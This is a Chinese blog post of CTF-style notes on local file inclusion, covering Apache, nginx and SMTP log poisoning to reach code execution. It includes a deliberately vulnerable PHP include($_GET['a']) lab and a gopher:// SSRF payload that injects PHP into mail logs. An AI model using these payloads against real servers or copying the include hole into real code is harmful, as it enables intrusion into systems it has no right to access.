<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 文件包含 · Imtinmin的小站</title><meta name="description" content="文件包含 - Imtinmin"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico?v=2018"><link rel="stylesheet" href="/css/style.css"><link rel="search" type="application/opensearchdescription+xml" href="http://imtinmin.github.io/atom.xml" title="Imtinmin的小站"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="wrap"><header><h1 class="title">Imtinmin的小站</h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives/" target="_self">ARCHIVE</a></li><li class="nav-list-item"><a class="nav-list-link" href="/about" target="_self">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">文件包含</h1><div class="post-info">2019-11-07</div><div class="post-content"><h1 id="apache-日志污染"><a href="#apache-日志污染" class="headerlink" title="apache 日志污染"></a>apache 日志污染</h1><p>需要能读到<code>apache</code>日志</p>
<p><img src="https://i.loli.net/2019/11/07/x73ImtKQVhfJRSP.png" alt="apache2"></p>
<p>虽然报400错误，但是会写入<code>access.log</code></p>
<p><img src="https://i.loli.net/2019/11/07/a8gc3vYq5MOIGWR.png" alt="image.png"></p>
<p>包含getshell</p>
<blockquote>
<p>要用burp，postman不然会被urlencode</p>
</blockquote>
<h1 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h1><p>参考链接： </p>
<blockquote>
<p><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a></p>
<p><a href="http://yulige.top/?p=346" target="_blank" rel="noopener">http://yulige.top/?p=346</a> </p>
</blockquote>
<p>###　环境搭建</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--<span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);--&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ubuntu16.04 需要把/var/log/nginx 目录权限设为645 </p>
<p>error.log 设为至少644</p>
</blockquote>
<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码,nginx 不会对get键编码</p>
<p><img src="https://i.loli.net/2019/11/07/ZJkcIgFLnveSM68.png" alt=""></p>
<p>成功写入</p>
<p><img src="https://i.loli.net/2019/11/07/gD8jtVpoR3CqNAT.png" alt="nginx-include2.png"></p>
<p>日志文件内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# cat error.log </span><br><span class="line">2019/11/07 07:32:07 [error] 9486#9486: *4 FastCGI sent in stderr: &quot;PHP message: PHP Notice:  Undefined index: a in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Filename cannot be empty in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Failed opening &apos;&apos; for inclusion (include_path=&apos;.:/usr/share/php&apos;) in /var/www/html/index.php on line 2&quot; while reading response header from upstream, client: 112.96.102.200, server: _, request: &quot;GET /?&lt;?php phpinfo();?&gt; HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php/php7.0-fpm.sock:&quot;, host: &quot;39.108.36.103:7777&quot;</span><br></pre></td></tr></table></figure>



<p>自己测试时，想清理日志可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# rm error.log </span><br><span class="line">root@9056889a4768:/var/log/nginx# touch error.log</span><br><span class="line">root@9056889a4768:/var/log/nginx# service nginx restart</span><br></pre></td></tr></table></figure>

<p>不重启日志不会写进去</p>
<hr>
<h1 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h1><p> 出自2019年6月安恒杯的一题 </p>
<blockquote>
<p>本地ubuntu18.04打不成，不知道为啥</p>
</blockquote>
<p>出题人镜像:   </p>
<blockquote>
<p> registry.cn-hangzhou.aliyuncs.com/bypass/postfix</p>
<p> 失效的话用：tinmin/gophersmtp</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/bypass/postfix</span><br></pre></td></tr></table></figure>

<p>用<code>Gopherus</code>构造payload</p>
<p><img src="https://i.loli.net/2019/11/07/wpIVrzCTmHbOKhR.png" alt="image.png"></p>
<p><code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:25/_MAIL%20FROM:%3Ctinmin%40tinmin.cn%3E%0ARCPT%20To:%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0ADATA%0AFrom:%3Ctinmin%40tinmin.cn%3E%0ASubject:test%0AMessage:test%0A.</span><br></pre></td></tr></table></figure>

<p>发送&gt;&gt;&gt;&gt;&gt;</p>
<p><img src="https://i.loli.net/2019/11/07/iOCfUB6IdQZWqMx.png" alt="curl"></p>
<p>成功！</p>
<p><img src="https://i.loli.net/2019/11/07/RZymX3OwBnTShEQ.png" alt="success"></p>
<p>日志被污染成</p>
<blockquote>
<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#x74;&#105;&#110;&#109;&#105;&#x6e;&#x40;&#x74;&#x69;&#110;&#109;&#x69;&#x6e;&#x2e;&#x63;&#x6e;" target="_blank" rel="noopener">&#x74;&#105;&#110;&#109;&#105;&#x6e;&#x40;&#x74;&#x69;&#110;&#109;&#x69;&#x6e;&#x2e;&#x63;&#x6e;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#105;&#110;&#x6d;&#x69;&#x6e;&#64;&#116;&#x69;&#x6e;&#109;&#x69;&#x6e;&#x2e;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#105;&#110;&#x6d;&#x69;&#x6e;&#64;&#116;&#x69;&#x6e;&#109;&#x69;&#x6e;&#x2e;&#99;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
</blockquote>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2019/11/09/2019-11-9-CTF/">PREV</a><a class="next" href="/2019/11/05/2019-11-5-CTF/">NEXT</a></div><div class="copyright"><p>© 2019 PEACE & LOVE</p><p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>, <a href="https://github.com/jeremyfan/hexo-theme-still" target="_blank">theme</a> by <a href="https://github.com/jeremyfan" target="_blank">Imtinmin</a>.</p></div></footer></div></body></html>